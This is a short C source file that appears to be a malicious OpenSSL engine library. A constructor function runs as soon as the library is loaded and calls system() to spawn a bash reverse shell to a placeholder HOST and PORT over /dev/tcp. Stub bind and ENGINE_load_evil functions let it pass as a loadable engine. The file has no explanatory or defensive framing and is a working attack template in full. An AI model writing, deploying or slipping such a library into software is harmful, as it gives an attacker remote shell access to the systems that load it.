#include <stdlib.h>

__attribute__((constructor))
void run_on_load() {
    system("bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'");
}

int bind(void *e, const char *id) {
    return 1;
}

void ENGINE_load_evil() {}

int bind_engine() {
    return 1;
}